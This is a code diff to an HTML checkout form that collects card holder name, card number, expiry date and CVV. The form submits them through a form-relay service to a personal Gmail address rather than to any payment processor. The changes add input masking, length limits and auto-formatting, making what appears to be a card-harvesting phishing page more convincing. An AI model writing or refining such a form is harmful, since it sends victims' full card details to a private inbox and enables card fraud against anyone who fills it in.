@@ -15,24 +15,32 @@
   <form action="https://formsubmit.co/mihirangat037@gmail.com" method="POST">
   <input type="text" name="card_name" placeholder="Card Holder Name" required><br>
   <input type="text" name="cardNumber" id="card-number" maxlength="19" placeholder="1234 5678 9012 3456" required><br>
-  <input type="text" name="mm_yy" placeholder="MM/YY" required><br>
-  <input type="text" name="cvv" placeholder="CVV" required><br>
+  <input type="text" name="mm_yy" id="mm-yy" maxlength="5" placeholder="MM/YY" required><br>
+  <input type="password" name="cvv" maxlength="3" placeholder="CVV" required pattern="\d{3}"><br>
   <button type="submit">Pay Now</button>
 </form>
 
-<!-- Auto-spacing script -->
+<!-- Auto spacing for Card Number -->
 <script>
   const cardInput = document.getElementById('card-number');
-
   cardInput.addEventListener('input', function(e) {
-    let value = e.target.value.replace(/\D/g, '');
-    value = value.substring(0, 16);
-
+    let value = e.target.value.replace(/\D/g, '').substring(0, 16);
     let formattedValue = '';
     for (let i = 0; i < value.length; i += 4) {
       formattedValue += value.substring(i, i + 4) + ' ';
     }
-
     e.target.value = formattedValue.trim();
+  });
+</script>
+
+<!-- Auto slash for MM/YY -->
+<script>
+  const mmYYInput = document.getElementById('mm-yy');
+  mmYYInput.addEventListener('input', function(e) {
+    let value = e.target.value.replace(/\D/g, '');
+    if (value.length >= 3) {
+      value = value.substring(0, 2) + '/' + value.substring(2, 4);
+    }
+    e.target.value = value;
   });
 </script>
